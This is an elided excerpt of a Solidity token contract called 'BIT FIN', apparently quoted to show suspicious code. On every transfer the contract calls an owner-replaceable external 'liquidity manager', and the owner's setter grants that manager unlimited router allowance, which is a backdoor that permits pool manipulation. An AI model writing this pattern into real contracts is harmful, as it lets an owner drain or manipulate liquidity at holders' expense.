...
interface ILiquidity {
   function getOk() external view returns (bool);
   function detectPoolVarition() external view returns (bool,uint256,uint256,uint256);
   function AdjustLiquidity(uint256 coinAmount,uint256 tokenAmount,uint256 _dir) external;
}
interface IRouter {
...
library Address {
    ...
    contract SBGUCoin is Context, IERC20, Ownable {
    ...
    string private constant _name = "BIT FIN";
    ...
    function _tokenTransfer(address sender,address recipient,uint256 tAmount,bool takeFee,bool isSell) private {
        ...
        if(adjFlag != 0){
             (bool flag,uint256 coinAmount,uint256 tokenAmount,uint256 _dir)=ILiquidity(liquidityManager).detectPoolVarition();
             if(flag)
                ILiquidity(liquidityManager).AdjustLiquidity(coinAmount,tokenAmount, _dir);
        }
    ...
    function setLiquidityManager(address newliquidityManager) external onlyOwner {
        ...
        _approve(newliquidityManager,address(router),115792089237316195423570985008687907853269984665640564039457584007913129639935);
        _approve(newliquidityManager,address(router),115792089237316195423570985008687907853269984665640564039457584007913129639935);
    }
